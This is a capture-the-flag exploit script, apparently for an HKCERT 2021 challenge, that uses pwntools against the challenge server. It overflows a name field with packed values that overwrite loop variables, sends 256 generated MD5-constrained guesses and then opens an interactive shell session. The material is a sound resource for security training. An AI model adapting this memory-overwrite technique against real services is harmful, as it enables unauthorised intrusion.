#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

from pwn import *
import binascii
import hashlib
import os

def connect():
    context.log_level = 'debug'
    # return process('./service')
    return remote('chalp.hkcert21.pwnable.hk', 28015)

def attempt(name, guesses):
    r = connect()
    r.sendlineafter(b'Hello! What is your name? ', name)
    for guess in guesses:
        r.sendlineafter(b'> ', guess)
    
    r.interactive()
    # r.wait_for_close()
    # payload = r.read().strip()
    # r.close()
    # return payload

def main():
    guesses = []
    for i in range(256):
        payload = b''
        while True:
            payload  = b'attempt%02x_' % i
            payload += b'bb6a'
            payload += binascii.hexlify(os.urandom(14))
            h = hashlib.md5(payload).digest()
            if b'\x00' not in h: break
        guesses.append(payload[10:])

    #       -overwrites j--   -overwrites i2-   -overwrites i1-
    attempt(p32(0xffffffff) + p32(0xffffffff) + p32(0xffffffff) + p32(0x1337), guesses)
    # i2 and j must be reasonable - otherwise it would return segfault.

if __name__ == '__main__':
    global debug
    debug = 'debug' in os.environ

    main()